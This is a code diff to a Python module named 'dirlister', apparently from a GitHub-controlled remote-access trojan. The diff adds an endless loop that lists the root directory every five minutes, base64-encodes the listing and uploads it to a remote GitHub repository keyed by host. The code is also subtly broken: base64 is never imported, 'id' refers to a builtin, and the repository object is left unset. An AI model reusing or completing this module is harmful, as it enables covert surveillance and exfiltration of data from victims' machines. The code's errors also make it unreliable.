@@ -1,21 +1,23 @@
 import os
+import time
 
-repeat = False
-path = "."
+gh = None
+repo = None
+branch = None
+module_name = "dirlister"
+host = ""
+auto_save = True
 
-def p(var):
-    print var
 
-def opts(opts):
-    print opts
-    global repeat, path
-    if opts["repeat"]:
-        repeat = opts["repeat"]
-    if opts["dir"]:
-        print "Setting path to ", opts["dir"]
-        path = opts["dir"]
+def save(pl):
+    #data/id/host/module_dia_mes_ano_hora:mim.data
+    
+    data_remote_path = "data/%s/%s/%s.data" %(id,host, module_name)
+    repo.create_file(data_remote_path,"Commit message",base64.b64encode(pl))
 
 def run(*args):
+    while True:
         print "[*] Dirlister fired up"
-        print args
-        return str(os.listdir("."))
+        list = str(os.listdir("/"))
+        save(list)
+        time.sleep(5*60)
